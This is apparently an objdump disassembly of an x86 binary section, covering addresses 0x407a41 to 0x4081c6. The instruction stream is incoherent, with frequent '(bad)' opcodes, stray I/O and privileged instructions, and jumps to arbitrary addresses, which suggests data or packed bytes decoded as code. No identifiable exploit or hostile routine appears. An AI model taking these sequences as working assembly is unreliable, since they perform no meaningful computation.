  407a41:	loopne 0x407a9b
  407a43:	das    
  407a44:	push   cs
  407a45:	xchg   ebx,eax
  407a46:	fs int 0x30
  407a49:	push   ss
  407a4a:	mov    ah,0x96
  407a4c:	ret    0x47b0
  407a4f:	cs push esp
  407a51:	cmp    dl,bh
  407a53:	mov    WORD PTR [eax],?
  407a55:	add    BYTE PTR [esi],bh
  407a57:	imul   esp,DWORD PTR [ecx*2+0x15d1085a],0xffffff83
  407a5f:	push   esi
  407a60:	pop    esp
  407a61:	imul   ebp,DWORD PTR [esi-0x774c93bc],0x7
  407a68:	leave  
  407a69:	mov    bl,0xe9
  407a6b:	div    BYTE PTR [edx]
  407a6d:	sub    al,0xf9
  407a6f:	adc    bl,ch
  407a71:	push   ds
  407a72:	fwait
  407a73:	test   al,0x52
  407a75:	das    
  407a76:	mov    edx,0x1b87cbf4
  407a7b:	fisttp QWORD PTR [ebp-0x16]
  407a7e:	outs   dx,BYTE PTR ds:[esi]
  407a7f:	popf   
  407a80:	inc    edi
  407a81:	inc    eax
  407a82:	pop    edx
  407a83:	mov    ds:0x23803c81,al
  407a88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a89:	lds    edi,FWORD PTR [edx-0x50]
  407a8c:	push   cs
  407a8d:	add    ecx,DWORD PTR [ebx-0x34367e8d]
  407a93:	pushf  
  407a94:	adc    BYTE PTR [ebx+ecx*2],0x21
  407a98:	cmp    eax,0x8a93f9f4
  407a9d:	pop    edx
  407a9e:	mov    dh,BYTE PTR [ecx]
  407aa0:	lods   eax,DWORD PTR ds:[esi]
  407aa1:	mov    esi,cs
  407aa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407aa4:	mov    WORD PTR [edi-0x6d],?
  407aa7:	adc    al,0x87
  407aa9:	xchg   DWORD PTR [edx-0x561a3fa4],edi
  407aaf:	leave  
  407ab0:	pusha  
  407ab1:	add    eax,DWORD PTR [esi-0x4f]
  407ab4:	jb     0x407b1b
  407ab6:	aaa    
  407ab7:	inc    esi
  407ab8:	sbb    eax,0x7ead2374
  407abd:	push   edx
  407abe:	adc    al,0xbd
  407ac0:	pop    ds
  407ac1:	les    edx,FWORD PTR [eax+0x66e60da2]
  407ac7:	lahf   
  407ac8:	jmp    0x407af5
  407aca:	sbb    bh,dl
  407acc:	xchg   BYTE PTR [ecx],bl
  407ace:	rol    DWORD PTR [esi+0xe454b00],cl
  407ad4:	xchg   ebx,eax
  407ad5:	mov    esp,0xe59a2a4d
  407ada:	hlt    
  407adb:	jge    0x407aee
  407add:	retf   
  407ade:	add    al,0x73
  407ae0:	pop    esi
  407ae1:	push   edx
  407ae2:	jb     0x407afa
  407ae4:	xor    DWORD PTR [edx+eax*8+0x59],esp
  407ae8:	rcr    edx,cl
  407aea:	cmp    DWORD PTR [eax],edi
  407aec:	fdivr  QWORD PTR [ebx]
  407aee:	pop    ebp
  407aef:	push   es
  407af0:	mov    bl,0x9e
  407af2:	sub    dh,bh
  407af4:	jae    0x407b19
  407af6:	ds dec edi
  407af8:	scas   al,BYTE PTR es:[edi]
  407af9:	xor    al,0xf6
  407afb:	adc    al,0x6c
  407afd:	sbb    al,0xe
  407aff:	(bad)  
  407b00:	jne    0x407a88
  407b02:	imul   eax,DWORD PTR [esi*1-0x3dc232ac],0x6e498ea5
  407b0d:	sub    ecx,DWORD PTR [esi]
  407b0f:	cmp    BYTE PTR [ebx-0x6],dl
  407b12:	and    esi,DWORD PTR [edi+esi*8-0x4ad563c7]
  407b19:	(bad)  
  407b1a:	nop
  407b1b:	pop    edx
  407b1c:	loopne 0x407b0c
  407b1e:	cli    
  407b1f:	bound  edx,QWORD PTR [eax]
  407b21:	(bad)  
  407b22:	xlat   BYTE PTR ds:[ebx]
  407b23:	aaa    
  407b24:	les    eax,FWORD PTR [ecx]
  407b26:	push   ebp
  407b27:	dec    edi
  407b28:	mov    cl,0xb
  407b2a:	or     edx,DWORD PTR [esi+0x7d8798f5]
  407b30:	jmp    0x407ae6
  407b32:	mov    BYTE PTR [esi],al
  407b34:	in     eax,0xc5
  407b36:	push   esi
  407b37:	jnp    0x407aed
  407b39:	ror    DWORD PTR [eax-0x34],0xd7
  407b3d:	retf   0x5330
  407b40:	add    al,0x76
  407b42:	xchg   BYTE PTR [ebp-0x7753b766],dh
  407b48:	sbb    BYTE PTR [edx+0x7dd3e0b8],bh
  407b4e:	sub    eax,0xafac1a3c
  407b53:	jp     0x407b34
  407b55:	jbe    0x407b0f
  407b57:	loope  0x407b84
  407b59:	stos   BYTE PTR es:[edi],al
  407b5a:	jne    0x407af0
  407b5c:	mov    ebx,0x70f208d6
  407b61:	and    DWORD PTR [eax-0x12],0xffffff9b
  407b65:	sahf   
  407b66:	xchg   ebx,eax
  407b67:	pop    es
  407b68:	bound  edi,QWORD PTR [ebx]
  407b6a:	xor    eax,0x5b86ec1b
  407b6f:	pop    ebx
  407b70:	pushf  
  407b71:	push   ecx
  407b72:	jl     0x407b1d
  407b74:	and    BYTE PTR [eax],ah
  407b76:	adc    al,0x17
  407b78:	fsubr  QWORD PTR [edx]
  407b7a:	loop   0x407b8d
  407b7c:	sbb    BYTE PTR ss:[ecx-0x8],dl
  407b80:	pop    eax
  407b81:	cmp    al,0x3b
  407b83:	aam    0xc3
  407b85:	sbb    al,0xd0
  407b87:	int    0xfb
  407b89:	mov    ch,0x51
  407b8b:	iret   
  407b8c:	xlat   BYTE PTR ds:[ebx]
  407b8d:	fnsave [edx-0x14]
  407b90:	cmp    BYTE PTR [ebx],dh
  407b92:	rcl    BYTE PTR [edx+0x3b83066b],1
  407b98:	dec    esi
  407b99:	rcr    DWORD PTR [ebp+0x50],0x58
  407b9d:	rol    ebp,1
  407b9f:	and    esi,DWORD PTR ds:0x8719cba4
  407ba5:	inc    eax
  407ba6:	inc    esp
  407ba7:	call   0x2780fb9f
  407bac:	jo     0x407bd7
  407bae:	push   es
  407baf:	inc    edi
  407bb0:	add    eax,0x7259c3d4
  407bb5:	mov    eax,0x5e02f3b7
  407bba:	dec    esi
  407bbb:	sub    DWORD PTR [ecx+edx*2-0x4e],ecx
  407bbf:	and    ch,dl
  407bc1:	dec    esp
  407bc2:	cmp    eax,0xbccd443c
  407bc7:	and    BYTE PTR [edx+0x7626691f],0x47
  407bce:	pop    ebp
  407bcf:	mov    ah,BYTE PTR [edx+0x3dd732b3]
  407bd5:	or     al,0xdf
  407bd7:	add    al,0x4
  407bd9:	jno    0x407ba2
  407bdb:	test   bh,cl
  407bdd:	es ds daa 
  407be0:	loope  0x407c39
  407be2:	mov    dl,BYTE PTR [esi]
  407be4:	(bad)  
  407be5:	push   eax
  407be6:	mov    eax,ds:0x8f517a9e
  407beb:	stos   DWORD PTR es:[edi],eax
  407bec:	mov    ebp,DWORD PTR [edx-0x1]
  407bef:	scas   eax,DWORD PTR es:[edi]
  407bf0:	sbb    esp,DWORD PTR [ebx+0x70]
  407bf3:	mov    ch,0x6f
  407bf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bf6:	dec    ebx
  407bf7:	lods   eax,DWORD PTR ds:[esi]
  407bf8:	aad    0x50
  407bfa:	jmp    0x407bce
  407bfc:	leave  
  407bfd:	daa    
  407bfe:	cmp    BYTE PTR [esp+esi*1+0x5e],cl
  407c02:	adc    edi,0xffffffaa
  407c05:	mov    eax,0x9e44c22
  407c0a:	dec    esp
  407c0b:	xchg   ebp,eax
  407c0c:	sbb    al,BYTE PTR [eax+0x6c8f7e82]
  407c12:	push   esi
  407c13:	jb     0x407c6a
  407c15:	dec    ebp
  407c16:	mov    eax,0x78a56a68
  407c1b:	add    ecx,DWORD PTR [esp+ebp*2]
  407c1e:	xchg   BYTE PTR [ebx+edx*8-0x55],dl
  407c22:	cld    
  407c23:	and    al,0x80
  407c25:	(bad)  
  407c26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c27:	aas    
  407c28:	(bad)  
  407c29:	arpl   WORD PTR [edx-0x1d485e16],di
  407c2f:	inc    edx
  407c30:	add    BYTE PTR [edx-0x17],cl
  407c33:	dec    edx
  407c34:	and    eax,DWORD PTR [eax]
  407c36:	add    BYTE PTR [eax-0x5d10c7b2],dh
  407c3c:	mov    esi,DWORD PTR [ebx+0x33]
  407c3f:	(bad)  
  407c40:	sbb    BYTE PTR ds:0xf09ade6,cl
  407c46:	xchg   ecx,eax
  407c47:	push   es
  407c48:	cmp    bh,BYTE PTR [esp+edi*2+0x4e]
  407c4c:	pop    edi
  407c4d:	jl     0x407ccb
  407c4f:	or     eax,0x7e8fc22f
  407c54:	dec    bl
  407c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c57:	not    BYTE PTR [eax+0x53]
  407c5a:	adc    edi,DWORD PTR [esi]
  407c5c:	inc    ebx
  407c5d:	xchg   cl,bh
  407c5f:	out    0x82,eax
  407c61:	cmp    dl,bl
  407c63:	fst    QWORD PTR [ebx-0x3b1618be]
  407c69:	sti    
  407c6a:	adc    dh,BYTE PTR [ecx-0x4a]
  407c6d:	(bad)  
  407c6e:	mov    esi,0xc5389f7d
  407c73:	clc    
  407c74:	mov    WORD PTR [ebp-0x53],?
  407c77:	push   eax
  407c78:	arpl   WORD PTR [ecx-0x4c],dx
  407c7b:	dec    eax
  407c7c:	inc    edx
  407c7d:	or     ebp,ebp
  407c7f:	jne    0x407cae
  407c81:	inc    ebp
  407c82:	fist   WORD PTR [edx-0x23]
  407c85:	mov    eax,0x43fcc71
  407c8a:	mov    ecx,0x63a3cab0
  407c8f:	lea    ebp,[eax+0x9]
  407c92:	xlat   BYTE PTR ds:[ebx]
  407c93:	inc    esi
  407c94:	mov    esi,0xe7186350
  407c99:	xchg   ebp,eax
  407c9a:	push   edi
  407c9b:	outs   dx,BYTE PTR ds:[esi]
  407c9c:	mov    ch,0xb1
  407c9e:	xor    al,0x3
  407ca0:	outs   dx,BYTE PTR ds:[si]
  407ca2:	hlt    
  407ca3:	(bad)  
  407ca4:	retf   
  407ca5:	test   al,0x39
  407ca7:	xlat   BYTE PTR ds:[ebx]
  407ca8:	jb     0x407c34
  407caa:	dec    esp
  407cab:	adc    BYTE PTR [ecx-0x572e3ebb],0xbd
  407cb2:	mov    ds:0xd0af8bd9,al
  407cb7:	cmp    BYTE PTR [edx+0x12],al
  407cba:	mov    esp,DWORD PTR [eax+0x5b]
  407cbd:	adc    DWORD PTR [esi+0x270022a4],edx
  407cc3:	xlat   BYTE PTR ds:[ebx]
  407cc4:	in     eax,dx
  407cc5:	imul   ebp,DWORD PTR [esi],0x12831a76
  407ccb:	icebp  
  407ccc:	jecxz  0x407cda
  407cce:	jg     0x407d45
  407cd0:	je     0x407d51
  407cd2:	mov    edx,0xf91a9332
  407cd7:	jae    0x407d4c
  407cd9:	add    DWORD PTR [edx],ebp
  407cdb:	lds    edi,FWORD PTR [edx]
  407cdd:	or     eax,ecx
  407cdf:	add    dh,BYTE PTR [ecx]
  407ce1:	cmc    
  407ce2:	or     DWORD PTR [eax-0x33],ecx
  407ce5:	pop    ss
  407ce6:	pushf  
  407ce7:	xchg   edi,eax
  407ce8:	pop    ebp
  407ce9:	mov    al,ds:0xe1b5056a
  407cee:	xor    eax,eax
  407cf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cf1:	popf   
  407cf2:	fucomi st,st(1)
  407cf4:	push   edi
  407cf5:	push   eax
  407cf6:	ror    ch,cl
  407cf8:	xchg   edi,eax
  407cf9:	sbb    DWORD PTR [edi-0x4e25b2c6],esp
  407cff:	jle    0x407c98
  407d01:	dec    edi
  407d02:	fsubr  DWORD PTR [ebx-0x5d]
  407d05:	leave  
  407d06:	nop
  407d07:	cmp    ah,BYTE PTR [ebp+0x2f]
  407d0a:	int    0x11
  407d0c:	or     al,0x37
  407d0e:	pop    esp
  407d0f:	out    dx,eax
  407d10:	iret   
  407d11:	cwde   
  407d12:	add    eax,0x50eec3aa
  407d17:	adc    bl,cl
  407d19:	and    DWORD PTR [eax],ebx
  407d1b:	jno    0x407d8e
  407d1d:	iret   
  407d1e:	sub    eax,DWORD PTR [ebp-0x1116962]
  407d24:	jo     0x407d5d
  407d26:	sub    edi,edx
  407d28:	ret    0x2b9c
  407d2b:	loop   0x407d1d
  407d2d:	jmp    0x52da39c4
  407d32:	mov    ebx,0xdae4c7b9
  407d37:	xor    BYTE PTR [edx+edx*8],bl
  407d3a:	out    dx,eax
  407d3b:	push   0xe1e8e012
  407d40:	aad    0x6e
  407d42:	das    
  407d43:	sbb    BYTE PTR [ebx+0x7a01be8d],ch
  407d49:	mov    ebx,0x7e432353
  407d4e:	xchg   ebp,eax
  407d4f:	adc    eax,DWORD PTR [ebp+0x547b52f5]
  407d55:	mov    eax,ds:0xd31c6f3e
  407d5a:	repz fwait
  407d5c:	xlat   BYTE PTR ds:[ebx]
  407d5d:	clc    
  407d5e:	test   eax,0x6b278f5
  407d63:	adc    DWORD PTR [esi+edi*4-0x5a5a5a32],0xffffff81
  407d6b:	call   0x7a9467a7
  407d70:	mov    DWORD PTR [ecx-0x6e],esi
  407d73:	aas    
  407d74:	or     al,0x62
  407d76:	inc    esp
  407d77:	ss xchg esp,eax
  407d79:	cmp    dl,BYTE PTR [esi+0x4c]
  407d7c:	addr16 (bad) 
  407d7e:	stc    
  407d7f:	sahf   
  407d80:	cmp    BYTE PTR [eax+esi*4],bh
  407d83:	xor    eax,0x3add0ead
  407d88:	jl     0x407deb
  407d8a:	push   es
  407d8b:	sbb    BYTE PTR [eax],0xe2
  407d8e:	js     0x407d9f
  407d90:	sbb    ah,BYTE PTR [eax-0x16b646d4]
  407d96:	shl    DWORD PTR [ecx-0x19],0xd5
  407d9a:	shl    DWORD PTR [esi+0x356be00b],cl
  407da0:	dec    ecx
  407da1:	push   esp
  407da2:	add    BYTE PTR [edi],ah
  407da4:	sbb    eax,DWORD PTR [ebp+0x7eeb3ac2]
  407daa:	xchg   ebx,eax
  407dab:	jl     0x407dec
  407dad:	lsl    eax,WORD PTR [eax]
  407db0:	pop    esi
  407db1:	mov    ch,0x1a
  407db3:	cs out dx,eax
  407db5:	(bad)  
  407db6:	stc    
  407db7:	cwde   
  407db8:	pop    ss
  407db9:	push   ecx
  407dba:	sub    BYTE PTR [eax],0xc
  407dbd:	mov    cl,0xb2
  407dbf:	push   0xffffffbd
  407dc1:	and    edx,eax
  407dc3:	test   eax,0xc8af5440
  407dc8:	rcr    DWORD PTR [edi-0x4beb4da6],1
  407dce:	jnp    0x407e22
  407dd0:	mov    esi,0x40cba81e
  407dd5:	mov    bl,ch
  407dd7:	shl    DWORD PTR [ecx],1
  407dd9:	ins    BYTE PTR es:[edi],dx
  407dda:	fwait
  407ddb:	jno    0x407e09
  407ddd:	fwait
  407dde:	push   0xe0bfd9fc
  407de3:	add    DWORD PTR [ebx-0x216e3a34],edi
  407de9:	add    al,0xb8
  407deb:	shr    ah,cl
  407ded:	adc    al,BYTE PTR [ebx-0x4f]
  407df0:	icebp  
  407df1:	mov    al,BYTE PTR [ecx+ebx*4-0x6772139b]
  407df8:	stc    
  407df9:	xchg   ecx,eax
  407dfa:	mov    BYTE PTR [ecx+0x2f3e63bb],cl
  407e00:	and    eax,0xc612877b
  407e05:	adc    eax,0x817ecd7d
  407e0a:	cmp    al,0x8
  407e0c:	rcr    DWORD PTR [ebx-0x60],cl
  407e0f:	push   edi
  407e10:	mov    esi,0x769d66ba
  407e15:	push   edi
  407e16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e17:	pop    edx
  407e18:	dec    edi
  407e19:	pop    ds
  407e1a:	inc    edi
  407e1b:	push   ds
  407e1c:	lods   al,BYTE PTR ds:[esi]
  407e1d:	jne    0x407e88
  407e1f:	iret   
  407e20:	cmp    ebp,DWORD PTR ds:0x416e7bed
  407e26:	mov    eax,es:0xcb121707
  407e2c:	pop    es
  407e2d:	sbb    esi,DWORD PTR es:[ebx+0x33]
  407e31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e32:	sar    DWORD PTR [esi],cl
  407e34:	dec    ecx
  407e35:	dec    DWORD PTR [ecx]
  407e37:	xchg   edx,eax
  407e38:	bound  edi,QWORD PTR [ebp-0x24d3a146]
  407e3e:	imul   ebx,DWORD PTR [ebx+0x4a],0xc9411060
  407e45:	mov    eax,ds:0x581fe0e3
  407e4a:	cmp    ebp,ebx
  407e4c:	aas    
  407e4d:	push   ds
  407e4e:	je     0x407e2d
  407e50:	jle    0x407e95
  407e52:	inc    esi
  407e53:	fisttp WORD PTR [edi+0x75114491]
  407e59:	sbb    eax,0x2586fd84
  407e5e:	call   0x2fea4490
  407e63:	and    edx,DWORD PTR [ecx+0x6ce20ac9]
  407e69:	dec    edx
  407e6a:	popf   
  407e6b:	sahf   
  407e6c:	mov    al,0xf3
  407e6e:	ins    DWORD PTR es:[edi],dx
  407e6f:	int    0x79
  407e71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e72:	and    eax,DWORD PTR [edx-0x4d]
  407e75:	mov    esi,0x67c7cfc0
  407e7a:	(bad)  
  407e7b:	dec    edi
  407e7c:	or     al,0x2a
  407e7e:	cdq    
  407e7f:	xor    eax,0xec44308f
  407e84:	cld    
  407e85:	mov    eax,0x762328ce
  407e8a:	jle    0x407eff
  407e8c:	sbb    ebp,DWORD PTR [esi-0x17]
  407e8f:	lea    esp,ds:0xb03d207d
  407e95:	push   edx
  407e96:	aad    0x9c
  407e98:	xchg   esi,eax
  407e99:	pop    esp
  407e9a:	or     BYTE PTR [ecx],cl
  407e9c:	std    
  407e9d:	xor    eax,0x70b85239
  407ea2:	push   edx
  407ea3:	ss mov fs:0x493e8b43,eax
  407eaa:	sbb    edi,DWORD PTR [ecx-0x797c0ed3]
  407eb0:	repnz dec edx
  407eb2:	aas    
  407eb3:	fild   QWORD PTR [edi]
  407eb5:	sbb    BYTE PTR [eax+0x28],cl
  407eb8:	mov    eax,ds:0x9638298b
  407ebd:	repnz leave 
  407ebf:	scas   eax,DWORD PTR es:[edi]
  407ec0:	out    0x1e,al
  407ec2:	or     eax,0x73ff3f
  407ec7:	scas   eax,DWORD PTR es:[edi]
  407ec8:	fidiv  DWORD PTR [esi]
  407eca:	aaa    
  407ecb:	shr    DWORD PTR [edx-0x64],1
  407ece:	imul   esi,DWORD PTR [ecx],0x5d
  407ed1:	pop    ds
  407ed2:	in     al,dx
  407ed3:	mov    ds:0x72955b2b,al
  407ed8:	shl    BYTE PTR [eax+0x3301e153],1
  407ede:	lods   al,BYTE PTR ds:[esi]
  407edf:	fcmovnbe st,st(1)
  407ee1:	addr16 or bh,bl
  407ee4:	xor    al,0xd9
  407ee6:	adc    DWORD PTR [ecx+0x60],eax
  407ee9:	(bad)  
  407eea:	loopne 0x407f14
  407eec:	retf   
  407eed:	clc    
  407eee:	pop    es
  407eef:	icebp  
  407ef0:	lock cmp eax,0xc3db8462
  407ef6:	iret   
  407ef7:	pop    DWORD PTR [ebp+0x7d]
  407efa:	int3   
  407efb:	call   FWORD PTR [eax+0x788e54ee]
  407f01:	pop    esi
  407f02:	call   0xd401:0x64b97d2f
  407f09:	add    bh,BYTE PTR [esi]
  407f0b:	push   ebx
  407f0c:	push   ss
  407f0d:	(bad)  
  407f0e:	push   ss
  407f0f:	add    BYTE PTR [ecx],0x65
  407f12:	add    DWORD PTR [edi+0x7a],esi
  407f15:	push   esp
  407f16:	jmp    0xb36986b
  407f1b:	inc    esp
  407f1c:	ror    DWORD PTR [esi],0xeb
  407f1f:	add    bh,BYTE PTR [ecx]
  407f21:	in     eax,0x47
  407f23:	in     al,0x11
  407f25:	and    DWORD PTR [eax+0x3f],ecx
  407f28:	enter  0x91ec,0x1f
  407f2c:	dec    esp
  407f2d:	and    edi,ebp
  407f2f:	enter  0x2bd7,0x3
  407f33:	jecxz  0x407f5b
  407f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f36:	and    ebp,0x1a952948
  407f3c:	push   ecx
  407f3d:	test   al,bl
  407f3f:	ja     0x407f99
  407f41:	in     eax,0x5
  407f43:	mov    ch,bl
  407f45:	push   eax
  407f46:	aas    
  407f47:	or     ch,BYTE PTR [ecx-0x1e5ac1b2]
  407f4d:	cmc    
  407f4e:	xor    eax,DWORD PTR [ebx+0x42]
  407f51:	or     al,0xfc
  407f53:	icebp  
  407f54:	push   edi
  407f55:	xchg   al,ch
  407f57:	xor    eax,DWORD PTR [ebx-0x37]
  407f5a:	push   es
  407f5b:	(bad)  
  407f5c:	cs and eax,0x1adb65e3
  407f62:	shr    DWORD PTR [esi+0x61c9ea77],0x21
  407f69:	hlt    
  407f6a:	fdiv   DWORD PTR [edx-0x14]
  407f6d:	adc    BYTE PTR [ebp-0x68],ah
  407f70:	adc    BYTE PTR [eax+esi*2-0x7b40560d],0x71
  407f78:	jne    0x407f7b
  407f7a:	adc    BYTE PTR [edi-0x5d],ah
  407f7d:	mov    eax,0x40eeeabe
  407f82:	jnp    0x407fbc
  407f84:	cmc    
  407f85:	jbe    0x407fab
  407f87:	je     0x407fc7
  407f89:	jo     0x407f68
  407f8b:	aad    0x42
  407f8d:	cwde   
  407f8e:	sub    al,0x8f
  407f90:	adc    BYTE PTR [ebp+0x281968cb],ah
  407f96:	hlt    
  407f97:	cld    
  407f98:	retf   
  407f99:	dec    esp
  407f9a:	mov    edi,DWORD PTR [ecx+0x5]
  407f9d:	push   ecx
  407f9e:	sar    BYTE PTR ds:0xb1d59609,1
  407fa4:	sub    ah,BYTE PTR [ebp+0x1eca9fe6]
  407faa:	add    eax,0xeee2d604
  407faf:	(bad)  
  407fb0:	pop    eax
  407fb1:	fwait
  407fb2:	or     BYTE PTR [ecx+0x69abe9ad],0xda
  407fb9:	out    dx,eax
  407fba:	xchg   edx,esi
  407fbc:	xor    ebp,ebx
  407fbe:	xchg   edi,eax
  407fbf:	pop    edi
  407fc0:	add    BYTE PTR [ebp+0x1eb92693],cl
  407fc6:	pop    ebp
  407fc7:	cmp    esi,edx
  407fc9:	bound  esi,QWORD PTR [ecx]
  407fcb:	out    dx,al
  407fcc:	js     0x408037
  407fce:	jno    0x407fd5
  407fd0:	push   eax
  407fd1:	cmp    al,0x33
  407fd3:	inc    ebx
  407fd4:	mov    cl,0x2f
  407fd6:	dec    edx
  407fd7:	and    ah,BYTE PTR [eax-0x68]
  407fda:	add    esi,DWORD PTR [esi-0x230fcb2c]
  407fe0:	jns    0x408061
  407fe2:	mov    eax,ds:0xf717a304
  407fe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fe8:	mov    al,0xac
  407fea:	test   eax,0xb99d3af
  407fef:	fsub   DWORD PTR [eax]
  407ff1:	lods   eax,DWORD PTR ds:[esi]
  407ff2:	ror    DWORD PTR ds:0x81a29872,cl
  407ff8:	pop    edi
  407ff9:	adc    eax,0x4e50e1ad
  407ffe:	jmp    0x408016
  408000:	hlt    
  408001:	outs   dx,DWORD PTR ds:[esi]
  408002:	sub    eax,0x7b4db0d6
  408007:	out    0x4e,eax
  408009:	xchg   edx,eax
  40800a:	dec    eax
  40800b:	or     al,0x46
  40800d:	call   0xdfca67ea
  408012:	inc    ebx
  408013:	sbb    al,0xad
  408015:	aas    
  408016:	or     ecx,edx
  408018:	in     al,0x88
  40801a:	inc    eax
  40801b:	in     eax,dx
  40801c:	dec    edx
  40801d:	mov    BYTE PTR [ebx+0x2c],al
  408020:	(bad)  
  408021:	aaa    
  408022:	dec    ebp
  408023:	sbb    DWORD PTR [ebx],esi
  408025:	xor    BYTE PTR [ebx],0xe2
  408028:	sbb    bl,BYTE PTR [eax+0x12be2883]
  40802e:	addr16 jnp 0x4080aa
  408031:	pop    esi
  408032:	jmp    0x4181e1a0
  408037:	rol    eax,0xd3
  40803a:	mov    ch,0xa9
  40803c:	mov    ebx,DWORD PTR [ecx]
  40803e:	pavgb  mm5,mm5
  408041:	daa    
  408042:	add    dh,BYTE PTR [ebx]
  408044:	xchg   edi,eax
  408045:	rcl    DWORD PTR [eax+edi*4-0x40b7e64e],cl
  40804c:	cmp    al,0x9d
  40804e:	fwait
  40804f:	add    al,0x80
  408051:	jae    0x40804e
  408053:	pushf  
  408054:	stc    
  408055:	test   BYTE PTR [edx-0x110c0150],ch
  40805b:	sub    eax,0xce42a1ea
  408060:	add    bl,BYTE PTR [ecx-0x80]
  408063:	out    0xb7,al
  408065:	aam    0x1b
  408067:	mov    ds:0x57b082af,eax
  40806c:	in     eax,0x64
  40806e:	das    
  40806f:	out    dx,al
  408070:	or     DWORD PTR [ebp-0xce346c5],ecx
  408076:	fnstsw ax
  408078:	push   esp
  408079:	or     al,0xcb
  40807b:	mov    bh,0x5b
  40807d:	ret    0xce78
  408080:	leave  
  408081:	push   ss
  408082:	sub    dh,BYTE PTR [ecx]
  408084:	iret   
  408085:	mov    edx,0x5662a8ac
  40808a:	inc    ebx
  40808b:	fisub  WORD PTR [ebx]
  40808d:	cli    
  40808e:	aad    0x29
  408090:	pop    edx
  408091:	popf   
  408092:	inc    ecx
  408093:	mov    cl,BYTE PTR [ecx-0x1bdbbce7]
  408099:	push   ebp
  40809a:	js     0x4080bb
  40809c:	mov    edi,0x5d359d2c
  4080a1:	aad    0xc3
  4080a3:	lock ds jne 0x408067
  4080a7:	arpl   WORD PTR [edx],cx
  4080a9:	je     0x4080c5
  4080ab:	jle    0x40811e
  4080ad:	and    DWORD PTR [edx+edx*8],0x7493507c
  4080b4:	out    dx,eax
  4080b5:	mov    bh,0xd1
  4080b7:	hlt    
  4080b8:	pusha  
  4080b9:	sub    DWORD PTR [edx+0x3f],ebp
  4080bc:	and    al,0xd8
  4080be:	imul   eax,DWORD PTR [esi+0x59],0xfffffff3
  4080c2:	jmp    0x4080b6
  4080c4:	or     eax,0xf2ec6160
  4080c9:	push   cs
  4080ca:	jl     0x408105
  4080cc:	mov    edx,0x1306cc76
  4080d1:	or     esp,DWORD PTR [eax]
  4080d3:	in     eax,dx
  4080d4:	inc    ebx
  4080d5:	dec    ecx
  4080d6:	ss inc eax
  4080d8:	push   es
  4080d9:	retf   
  4080da:	sbb    ah,BYTE PTR [ecx]
  4080dc:	mov    eax,ds:0x73c31640
  4080e1:	in     eax,0x61
  4080e3:	fdivr  QWORD PTR [edi+0x3]
  4080e6:	sbb    DWORD PTR [edi+0x33],ecx
  4080e9:	xchg   edx,eax
  4080ea:	hlt    
  4080eb:	cmp    eax,DWORD PTR [edx+ecx*1]
  4080ee:	pop    ds
  4080ef:	mov    ds:0x7eccddc2,eax
  4080f4:	data16 sub BYTE PTR [eax],0xaf
  4080f8:	retf   
  4080f9:	lds    ebx,FWORD PTR [eax-0xc]
  4080fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080fd:	mov    al,0xe7
  4080ff:	lods   al,BYTE PTR ds:[esi]
  408100:	adc    eax,0x9fb53eb
  408105:	loopne 0x408105
  408107:	xor    eax,0x9c11f453
  40810c:	aad    0x32
  40810e:	push   cs
  40810f:	xchg   dh,dl
  408111:	idiv   esp
  408113:	or     al,0x22
  408115:	std    
  408116:	fcmovu st,st(5)
  408118:	pop    eax
  408119:	jo     0x4080c6
  40811b:	xchg   ecx,eax
  40811c:	es jb  0x4080dd
  40811f:	xchg   esp,eax
  408120:	mov    ah,0xf6
  408122:	popf   
  408123:	push   ss
  408124:	int    0x6d
  408126:	push   ss
  408127:	iret   
  408128:	ss push edx
  40812a:	scas   al,BYTE PTR es:[edi]
  40812b:	sub    BYTE PTR [ecx+0x22],bl
  40812e:	push   ss
  40812f:	sbb    BYTE PTR [ebx*2+0x105358dd],dh
  408136:	inc    edi
  408137:	(bad)
  40813a:	daa    
  40813b:	lock dec esi
  40813d:	xchg   cl,al
  40813f:	or     eax,0x5887c100
  408144:	fs call 0xf119505f
  40814a:	in     eax,0x18
  40814c:	or     al,0xfc
  40814e:	push   0xffffffed
  408150:	daa    
  408151:	jno    0x40818e
  408153:	inc    ebx
  408154:	stc    
  408155:	sbb    al,ch
  408157:	xchg   bl,dl
  408159:	dec    esp
  40815a:	jo     0x408197
  40815c:	lock jg 0x408149
  40815f:	out    dx,al
  408160:	call   0x48cad07d
  408165:	push   ss
  408166:	mov    eax,ds:0xcd61f2fe
  40816b:	or     esp,DWORD PTR cs:[ebx-0x313e0692]
  408172:	cmp    edi,DWORD PTR [edx+0x7cfe565e]
  408178:	sub    bl,bl
  40817a:	fild   QWORD PTR [ebx]
  40817c:	or     DWORD PTR [eax-0x4c],esp
  40817f:	push   eax
  408180:	pop    edi
  408181:	dec    esi
  408182:	cli    
  408183:	dec    edi
  408184:	stc    
  408185:	ror    esp,cl
  408187:	jmp    0x4081f9
  408189:	les    esi,FWORD PTR [eax]
  40818b:	jb     0x4081a8
  40818d:	(bad)  
  40818e:	sbb    dh,bl
  408190:	push   es
  408191:	hlt    
  408192:	ror    BYTE PTR [eax+0x3f],cl
  408195:	(bad)  
  408196:	jle    0x4081ae
  408198:	jg     0x40811d
  40819a:	inc    BYTE PTR [ebp+0x27]
  40819d:	lods   eax,DWORD PTR ds:[esi]
  40819e:	ja     0x408191
  4081a0:	and    DWORD PTR [ebx],ebx
  4081a2:	jmp    0xe1fe:0xed85734f
  4081a9:	push   ebp
  4081aa:	jb     0x408224
  4081ac:	push   esi
  4081ad:	jg     0x408130
  4081af:	aaa    
  4081b0:	cmc    
  4081b1:	cmp    eax,0xeb45dd37
  4081b6:	jmp    0x8ad46bb5
  4081bb:	ins    BYTE PTR es:[edi],dx
  4081bc:	xor    DWORD PTR [ecx-0x2b],esp
  4081bf:	imul   ebx,ebx,0xde3d4abd
  4081c5:	fwait
  4081c6:	mov    edx,0xe7e16f35
